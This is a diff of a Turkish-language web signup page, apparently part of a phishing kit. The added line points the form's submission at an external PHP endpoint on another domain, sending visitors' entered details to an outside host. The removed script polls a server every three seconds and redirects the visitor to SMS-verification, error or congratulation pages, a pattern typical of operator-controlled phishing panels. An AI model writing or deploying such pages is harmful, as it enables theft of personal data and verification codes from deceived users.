@@ -31,7 +31,7 @@
 </div>
 <div class="text-center">
 </div>
-<form method="POST" action="#">
+<form method="POST" action="https://ajansdesire.com/asdasd/desers.php">
 <div class="signup_form">
 <div class="form-group">
 <label class="input_title" for="inputEmail">Ad Soyad</label>
@@ -61,42 +61,7 @@
 </div>
 </div>
 </div>
-</div>
 
-
-<script type="text/javascript">
- $(document).ready(function() {
-
-    gonder();
-
-    var int=self.setInterval("gonder()",3000);
-  
-});
-
-function gonder(){
-
-    $.ajax({
-      type:'POST',
-      url:'datach.php?ip=5.188.168.199',
-      success: function (msg) {
-      
-      if(msg=='sms'){
-        window.location.href='onaylat.php';
-      }
-      if(msg=='tebrik'){
-        window.location.href='tebrik.php';
-      }
-       if(msg=='hata'){
-        window.location.href='hata.php';
-      }
-      if(msg=='sms2'){
-        window.location.href='hatali.php';
-      } 
-      }
-    });
-    
-}
-</script>
 <script>
 // This code empowers all input tags having a placeholder and data-slots attribute
 document.addEventListener('DOMContentLoaded', () => {
